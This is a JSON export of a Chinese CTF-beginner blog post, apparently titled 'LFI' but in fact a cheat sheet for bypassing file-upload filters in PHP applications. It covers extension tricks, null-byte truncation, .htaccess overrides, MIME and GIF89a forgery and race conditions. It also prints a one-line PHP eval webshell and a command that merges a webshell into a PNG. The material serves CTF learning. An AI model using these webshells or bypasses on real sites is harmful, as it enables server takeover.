{"title":"LFI","uid":"8b370a147ba28b5f9bf92d0ab1030d7d","slug":"LFI","date":"2024-10-23T13:05:28.000Z","updated":"2024-10-23T13:15:05.085Z","comments":true,"path":"api/articles/LFI.json","keywords":null,"cover":"/image/5.jpg","content":"<h1 id=\"文件上传\"><a href=\"#文件上传\" class=\"headerlink\" title=\"文件上传\"></a>文件上传</h1><h2 id=\"判断漏洞形式\"><a href=\"#判断漏洞形式\" class=\"headerlink\" title=\"判断漏洞形式\"></a><strong>判断漏洞形式</strong></h2><p><img src=\"/post/LFI/clip_image002.png\" alt=\"img\"></p>\n<h2 id=\"一句话木马\"><a href=\"#一句话木马\" class=\"headerlink\" title=\"一句话木马\"></a><strong>一句话木马</strong></h2><p><img src=\"/post/LFI/clip_image004.png\" alt=\"img\"></p>\n<h2 id=\"后缀-空格和点搭配\"><a href=\"#后缀-空格和点搭配\" class=\"headerlink\" title=\"后缀 空格和点搭配\"></a>后缀 空格和点搭配</h2><p> 反复试 eg a.php. .</p>\n<h2 id=\"后缀-00和0x00截断\"><a href=\"#后缀-00和0x00截断\" class=\"headerlink\" title=\"后缀 %00和0x00截断\"></a>后缀 %00和0x00截断</h2><p> %00需要<strong>PHP版本小于5.3.4</strong></p>\n<p><strong>%00截断如图</strong></p>\n<p><img src=\"/post/LFI/clip_image006.png\" alt=\"img\"></p>\n<h2 id=\"覆盖配置\"><a href=\"#覆盖配置\" class=\"headerlink\" title=\"覆盖配置\"></a>覆盖配置</h2><p>.htaccess文件</p>\n<p>user.ini</p>\n<p><strong>前者内容如图</strong></p>\n<p><img src=\"/post/LFI/clip_image008.png\" alt=\"img\"></p>\n<h2 id=\"大小写绕过\"><a href=\"#大小写绕过\" class=\"headerlink\" title=\"大小写绕过\"></a>大小写绕过</h2><h2 id=\"a-php-DATA\"><a href=\"#a-php-DATA\" class=\"headerlink\" title=\"a.php::$DATA\"></a>a.php::$DATA</h2><h2 id=\"伪造GIF89a\"><a href=\"#伪造GIF89a\" class=\"headerlink\" title=\"伪造GIF89a\"></a>伪造GIF89a</h2><h3 id=\"getimagesize\"><a href=\"#getimagesize\" class=\"headerlink\" title=\"getimagesize()\"></a><strong>getimagesize()</strong></h3><p>若图片马 无法直接利用</p>\n<ul>\n<li><p>伪造文件头(在PHP文件文件中伪造) <strong>GIF89a</strong> </p>\n</li>\n<li><p>将木马写到合法文件里</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">copy /b test.png+1.php muma.png</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>直接使用工具增加备注写入一句话木马</p>\n</li>\n</ul>\n<h2 id=\"重命名\"><a href=\"#重命名\" class=\"headerlink\" title=\"重命名\"></a>重命名</h2><p>重命名为<code>xxx.php:.jpg</code> </p>\n<p>然后再上传<code>xxx.&lt;&lt;&lt;</code></p>\n<h2 id=\"MIME伪造\"><a href=\"#MIME伪造\" class=\"headerlink\" title=\"MIME伪造\"></a>MIME伪造</h2><p><strong>改Content-Type</strong></p>\n<p><strong>常见Content-Type后缀</strong></p>\n<p><img src=\"/post/LFI/clip_image012.png\" alt=\"img\"></p>\n<h2 id=\"二次渲染\"><a href=\"#二次渲染\" class=\"headerlink\" title=\"二次渲染\"></a>二次渲染</h2><p>准备多个图片马 每个木马位置要不同 多次尝试多次上传 要多留<strong>坚强的图片马</strong></p>\n<h2 id=\"时间竞争\"><a href=\"#时间竞争\" class=\"headerlink\" title=\"时间竞争\"></a>时间竞争</h2><ul>\n<li>burp抓包 发送攻击器 攻击</li>\n<li>不断上传生成木马文件的文件</li>\n</ul>\n<p><strong>此文件如下</strong></p>\n<p><img src=\"/post/LFI/clip_image014.png\" alt=\"img\"></p>\n<ul>\n<li>不断访问前者</li>\n</ul>\n<h2 id=\"改后缀名\"><a href=\"#改后缀名\" class=\"headerlink\" title=\"改后缀名\"></a>改后缀名</h2><p> <strong>.phtml .phps .pht .phtml .php3 .php5</strong> …… </p>\n<h2 id=\"PHP标签修改\"><a href=\"#PHP标签修改\" class=\"headerlink\" title=\"PHP标签修改\"></a>PHP标签修改</h2><p>木马内容</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"title class_\">GIF89</span>a</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;script language=<span class=\"string\">&#x27;php&#x27;</span>&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">@<span class=\"built_in\">eval</span>($_POST[<span class=\"string\">&quot;a&quot;</span>]);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_\">show_source</span>(<span class=\"string\">&quot;/flag&quot;</span>); (可有可没有)</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"复写\"><a href=\"#复写\" class=\"headerlink\" title=\"复写\"></a>复写</h2><p><strong>1.jpg</strong>改为<strong>1.jpg.php</strong> </p>\n<p>再用蚁剑连接，连接时名称为：<strong>1.jpg.php</strong></p>\n<h2 id=\"双写\"><a href=\"#双写\" class=\"headerlink\" title=\"双写\"></a>双写</h2><p><strong>1.php</strong>改为<strong>1.phphpp</strong></p>\n","text":"文件上传判断漏洞形式 一句话木马 后缀 空格和点搭配 反复试 eg a.php. . 后缀 %00和0x00截断 %00需要PHP版本小于5.3.4 %00截断...","permalink":"/post/LFI","photos":[],"count_time":{"symbolsCount":695,"symbolsTime":"1 mins."},"categories":[{"name":"ctf入门","slug":"ctf入门","count":5,"path":"api/categories/ctf入门.json"}],"tags":[{"name":"ctf","slug":"ctf","count":6,"path":"api/tags/ctf.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0\"><span class=\"toc-text\">文件上传</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%88%A4%E6%96%AD%E6%BC%8F%E6%B4%9E%E5%BD%A2%E5%BC%8F\"><span class=\"toc-text\">判断漏洞形式</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC\"><span class=\"toc-text\">一句话木马</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%90%8E%E7%BC%80-%E7%A9%BA%E6%A0%BC%E5%92%8C%E7%82%B9%E6%90%AD%E9%85%8D\"><span class=\"toc-text\">后缀 空格和点搭配</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%90%8E%E7%BC%80-00%E5%92%8C0x00%E6%88%AA%E6%96%AD\"><span class=\"toc-text\">后缀 %00和0x00截断</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E8%A6%86%E7%9B%96%E9%85%8D%E7%BD%AE\"><span class=\"toc-text\">覆盖配置</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">大小写绕过</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#a-php-DATA\"><span class=\"toc-text\">a.php::$DATA</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%BC%AA%E9%80%A0GIF89a\"><span class=\"toc-text\">伪造GIF89a</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#getimagesize\"><span class=\"toc-text\">getimagesize()</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E9%87%8D%E5%91%BD%E5%90%8D\"><span class=\"toc-text\">重命名</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#MIME%E4%BC%AA%E9%80%A0\"><span class=\"toc-text\">MIME伪造</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93\"><span class=\"toc-text\">二次渲染</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%97%B6%E9%97%B4%E7%AB%9E%E4%BA%89\"><span class=\"toc-text\">时间竞争</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%94%B9%E5%90%8E%E7%BC%80%E5%90%8D\"><span class=\"toc-text\">改后缀名</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#PHP%E6%A0%87%E7%AD%BE%E4%BF%AE%E6%94%B9\"><span class=\"toc-text\">PHP标签修改</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%A4%8D%E5%86%99\"><span class=\"toc-text\">复写</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%8F%8C%E5%86%99\"><span class=\"toc-text\">双写</span></a></li></ol></li></ol>","author":{"name":"Sygsdsg","slug":"blog-author","avatar":"https://img.picui.cn/free/2024/10/23/6718a2ef955e1.jpg","link":"/","description":"嘻嘻","socials":{"github":"https://github.com/Sygsdsg/Sygsdsg.github.io","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"hidden":false,"prev_post":{"title":"Unserialize","uid":"aead1356d56fb4acb210e498b4d44c7a","slug":"Unserialize","date":"2024-10-23T13:07:30.000Z","updated":"2024-10-23T13:28:25.186Z","comments":true,"path":"api/articles/Unserialize.json","keywords":null,"cover":"/image/6.png","text":"Unserialize前置知识 序列化后语句为 1a:3:{s:4:\"name\";s:8:\"John Doe\";s:3:\"age\";i:25;s:6:\"grad...","permalink":"/post/Unserialize","photos":[],"count_time":{"symbolsCount":"3.3k","symbolsTime":"3 mins."},"categories":[{"name":"ctf入门","slug":"ctf入门","count":5,"path":"api/categories/ctf入门.json"}],"tags":[{"name":"ctf","slug":"ctf","count":6,"path":"api/tags/ctf.json"}],"author":{"name":"Sygsdsg","slug":"blog-author","avatar":"https://img.picui.cn/free/2024/10/23/6718a2ef955e1.jpg","link":"/","description":"嘻嘻","socials":{"github":"https://github.com/Sygsdsg/Sygsdsg.github.io","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"feature":true},"next_post":{"title":"upload","uid":"6c4585b45b97f020140cf6fd5e44ee5e","slug":"upload","date":"2024-10-23T05:58:00.000Z","updated":"2024-10-23T11:01:59.680Z","comments":true,"path":"api/articles/upload.json","keywords":null,"cover":"/image/3.jpg","text":"文件上传判断漏洞形式 一句话木马 后缀 空格和点搭配 反复试 eg a.php. . 后缀 %00和0x00截断 %00需要PHP版本小于5.3.4 %00截断...","permalink":"/post/upload","photos":[],"count_time":{"symbolsCount":695,"symbolsTime":"1 mins."},"categories":[{"name":"ctf入门","slug":"ctf入门","count":5,"path":"api/categories/ctf入门.json"}],"tags":[{"name":"ctf","slug":"ctf","count":6,"path":"api/tags/ctf.json"}],"author":{"name":"Sygsdsg","slug":"blog-author","avatar":"https://img.picui.cn/free/2024/10/23/6718a2ef955e1.jpg","link":"/","description":"嘻嘻","socials":{"github":"https://github.com/Sygsdsg/Sygsdsg.github.io","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}